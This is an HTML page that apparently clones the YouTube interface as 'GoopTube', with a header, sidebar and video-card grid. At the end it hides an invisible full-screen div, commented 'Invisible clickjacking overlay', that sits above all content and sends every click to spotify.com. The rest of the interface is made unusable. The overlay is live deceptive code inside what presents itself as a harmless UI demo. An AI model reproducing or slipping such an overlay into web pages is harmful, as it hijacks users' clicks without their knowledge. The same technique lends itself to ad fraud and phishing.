<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube UI Clone</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:#0f0f0f;
    color:white;
}

.header{
    position:fixed;
    top:0;
    left:0;
    right:0;
    height:60px;
    background:#0f0f0f;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 20px;
    border-bottom:1px solid #222;
    z-index:100;
}

.logo{
    font-size:22px;
    font-weight:bold;
    color:red;
}

.search-bar{
    width:40%;
    display:flex;
}

.search-bar input{
    flex:1;
    padding:10px;
    border:1px solid #333;
    background:#121212;
    color:white;
    border-radius:20px 0 0 20px;
}

.search-bar button{
    padding:10px 20px;
    border:none;
    background:#222;
    color:white;
    border-radius:0 20px 20px 0;
    cursor:pointer;
}

.profile{
    width:40px;
    height:40px;
    border-radius:50%;
    background:#666;
}

.sidebar{
    position:fixed;
    top:60px;
    left:0;
    width:220px;
    height:100vh;
    background:#0f0f0f;
    padding-top:15px;
}

.sidebar a{
    display:block;
    color:white;
    text-decoration:none;
    padding:12px 20px;
    border-radius:10px;
    margin:2px 10px;
}

.sidebar a:hover{
    background:#272727;
}

.content{
    margin-left:220px;
    margin-top:70px;
    padding:20px;
}

.video-grid{
    display:grid;
    grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
    gap:20px;
}

.video-card{
    cursor:pointer;
}

.thumbnail{
    width:100%;
    height:180px;
    background:#444;
    border-radius:12px;
}

.video-info{
    display:flex;
    margin-top:10px;
}

.channel-pic{
    width:40px;
    height:40px;
    border-radius:50%;
    background:#777;
    margin-right:10px;
}

.video-details h3{
    font-size:15px;
    margin-bottom:5px;
}

.video-details p{
    color:#aaa;
    font-size:13px;
}
</style>
</head>
<body>

<header class="header">
    <div class="logo">▶ GoopTube</div>
    <div class="search-bar">
        <input type="text" placeholder="Search">
        <button>🔍</button>
    </div>
    <div class="profile"></div>
</header>

<nav class="sidebar">
    <a href="#">🏠 Home</a>
    <a href="#">🎬 Shorts</a>
    <a href="#">📺 Subscriptions</a>
    <a href="#">📚 Library</a>
    <a href="#">🕒 History</a>
</nav>

<main class="content">
    <div class="video-grid">

        <div class="video-card">
            <div class="thumbnail"></div>
            <div class="video-info">
                <div class="channel-pic"></div>
                <div class="video-details">
                    <h3>Building a YouTube Clone with HTML & CSS</h3>
                    <p>Code Channel</p>
                    <p>1.2M views • 2 days ago</p>
                </div>
            </div>
        </div>

      <div class="video-card">
    <video width="100%" height="180" controls style="border-radius:12px;">
        <source src="All talking Ben voice lines (free to use) - KingBing (1080p, h264).mp4" type="video/mp4">
    </video>
    <div class="video-info">
        <div class="channel-pic"></div>
        <div class="video-details">
            <h3>Building a YouTube Clone with HTML & CSS</h3>
            <p>Code Channel</p>
            <p>1.2M views • 2 days ago</p>
        </div>
    </div>
</div>

        <div class="video-card">
            <div class="thumbnail"></div>
            <div class="video-info">
                <div class="channel-pic"></div>
                <div class="video-details">
                    <h3>Modern Web Design Trends</h3>
                    <p>Design Lab</p>
                    <p>98K views • 3 days ago</p>
                </div>
            </div>
        </div>

    </div>
</main>

<!-- Invisible clickjacking overlay -->
<div onclick="window.location.href='https://spotify.com'"
     style="position:fixed; top:0; left:0; width:100%; height:100%; 
            cursor:pointer; z-index:999;">
</div>

</body>
</html>
